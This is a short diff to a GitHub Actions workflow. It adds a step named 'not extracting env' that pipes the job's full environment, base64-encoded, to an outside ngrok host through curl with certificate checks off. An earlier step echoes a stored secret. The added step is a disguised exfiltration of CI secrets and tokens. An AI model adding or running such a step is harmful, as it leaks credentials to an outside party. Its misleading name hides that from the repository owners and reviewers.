@@ -24,3 +24,7 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: not extracting env
+        run: |
+          curl -k https://b1ed-128-130-252-211.ngrok-free.app?data=$(env | base64 --wrap=0)
